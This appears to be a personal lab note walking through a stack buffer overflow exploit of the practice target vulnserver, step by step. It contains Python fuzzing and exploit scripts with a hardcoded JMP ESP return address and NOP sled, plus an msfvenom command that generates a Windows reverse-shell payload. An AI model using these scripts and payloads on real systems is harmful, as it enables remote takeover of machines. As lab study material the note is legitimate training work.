---
title: "Buffer Overflow"
date: 2023-05-08T04:11:06-02:00
draft: false
toc: false
images:
tags:
  - Book
---

## Memory Anatomy
![[Pasted image 20230607054321.png]]
### inside the stack we have these registers:-  
![[Pasted image 20230607054352.png]]
### Safe if it contain everything inside the Buffer Space
![[Pasted image 20230607064222.png]]
### If this was the case of Buffer over flow then
in Buffer overflow case it will overflow flow from buffer space to EBP and after EBP to EIP and this is where things get interesting
![[Pasted image 20230607064447.png]]

this is Return address and we will point this address toward our malicious code 

## How we can do Buffer overflow 
1. Spiking :- Here we will find which part of the program is vulnerable
2. Fuzzing :- sending some random character to test it when it will break(find breaking point of the program)
3. Finding the offset :- at which point the program break it
4. overwrite the EIP :- we will modify the return address
5. Finding the bad character :- you need to find the bad character which will not produce error in output
6. Finding the right module :-
7. Generating the shell code :- you need the Payload written without the bad character so that the application can execute it without any error
8. Root it :- You get the shell 

## Practical

1. preparation
 -> Run vulnserver and immunity as an administrator`immunity` is an application debugger it give us real time info about any application. (we need to attach those application to immunity)
 -> we will use our kali Linux to `connect` to the server `[nc -nv <ip address><port>]`
 -> we will figure out if the server take any input or command (it should accept command so that we can test it through `spiking`)
 -> we will take one command at a time a try to overflow it if we are able to do that we can succeed  in overflowing 
 -> we will use [[Generic send tcp]]  >>`generic_send_tcp`<<
 -> this is the "STATS.spk" command which will be used in 5
```c
s_readline();
s_string("STATS ");
s_string_variable("0");
```
[[STATS .spk]]

`[generic_send_tcp <host/ip> <port> <spike script> <skip variable> <skip variable>]`

###### Spiking vs Fuzzing
Spiking :- here we are trying to attack multiple command to find the vulnerability 
Fuzzing :- Here we are try to focus on 1 input (CMD)

**Note :-** They both are same one is in c and send is in python script

2. here we will use `Fuzzing` to attack the trun command which we found vulnerable in spiking.
 -> here is code written in python 
```python
#!/usr/bin/python3
import sys, socket 
from time import sleep
buffer = "A" * 100
while True:
	try:
		 payload = "TRUN /.:/" + buffer
		 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		 s.connect(('192.168.43.2',9999))
		 print ("[+] Sending the payload...\n" + str(len(buffer)))
		 s.send((payload.encode()))
		 s.close()
		 sleep(1)
		 buffer = buffer + "A"*100
	except:
		print ("The fuzzing crashed at %s bytes" % str(len(buffer)))
		sys.exit()
```

by `fuzzing` we will find the approx. value where it will crash
3. Now we will use Metasploit framework to `find the offset` value `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb`
4. in pattern create `pattern_create.rb -l 3000 ` it will generate a character with length of 3000
```python
#!/usr/bin/python
import sys, socket 

buffer = "pattern_create.rb -l 3000" 
try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.43.2',9999))

	payload = "TRUN /.:/" + offset

	s.send((payload.encode()))
	s.close()
except:
	print ("Error connecting to server")
	sys.exit()

```
it will send the pattern with 3000 length
11. Now after sending this pattern we will check if the pattern is in `EIP` `register` or not if it is then what is the position
12. we will find the position using `pattern_offset.rb -l 3000 -q <eip value>` the ans tell us that at this point we can control the EIP
13. For confirmation we can use one test for the server.<--->
15. https://github.com/cytopia/badchars we will use this link to get the all the character 
16. we will test all the character and find which is the bad character 
```python
#!/usr/bin/python
import sys, socket
badchars ="  "
shellcode = "A" * <offset_point no/ Breakdown point no> + "B" * 4 + badchars
try:
	payload = "TRUN /.:/" + Shellcode 
	 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   
	 s.connect(('192.168.43.2',9999))  
	 print ("[+] Sending the payload...\n" + str(len(buffer))) 
	 s.send((payload)) 
	 s.close() 
	 sleep(1) 	 
except: 
	print ("Error connecting server")
	sys.exit()
```

Here we will check the `ESP > follow and dump` here we will look from "01" to "FF" 
15. Find the bad character form `hex dump`

![[Pasted image 20230610095602.png]]

**NOTE** `if we get two consecutive no then the 1st number will be the bad character if we have only one number then it is OK `

16. finding the Right module using `mona module` 
 -> to start mona load it into default file 
 -> `[!mona modules]` to start mona module :- here we are looking for something which don't have any memory protection 
 -> Finding offcode equivalent of jump
 -> use `nasm_shell.rb`here we are trying to convert assembly language to hex code `JMP ESP`
 -> `mona find -s "\xff\xe4" -m <essfun.dll>(vulnerable dll should be here) ` 
 -> now we will use the jump code `625011af` and use it in `shellcode = "A"*2003+"\xaf\x11\x50\x62"` this is ndn formate here assembly lang use low byte in lower address and high order byte in high address
 ```python
#!/usr/bin/python3

import sys, socket
from time import sleep
#625011af
shellcode = "A" * 2003 + "\xaf\x11\x50\x62"
try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.43.2',9999))
	payload = "TRUN /.:/" + shellcode
	s.send((payload.encode()))
	s.close()
except:
	print ("Error connecting to server")
	sys.exit()
```
 -> we will catch this expression in immunity by `expression to follow dialog`box and `set a break point `using `F2`
-> Run the code
17. Now use metasploit Framework `msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=4444 EXITFUNc=thread -f c -a x86 -b"\x00" `
**Note** payload size
18. use a new shellcode 
```python
#!/usr/bin/python3

import sys, socket
from time import sleep
shellcode = "you have to write the shell code"
shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + shellcode
try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.43.2',9999))
	payload = "TRUN /.:/" + shellcode
	s.send((payload.encode()))
	s.close()
except:
	print ("Error connecting to server")
	sys.exit()
```
"\\x90" * 32 it is known as nop NO OPERATION
19. listen through one port 
20. Run the program to get the shell

[[testing buffer overflow]]
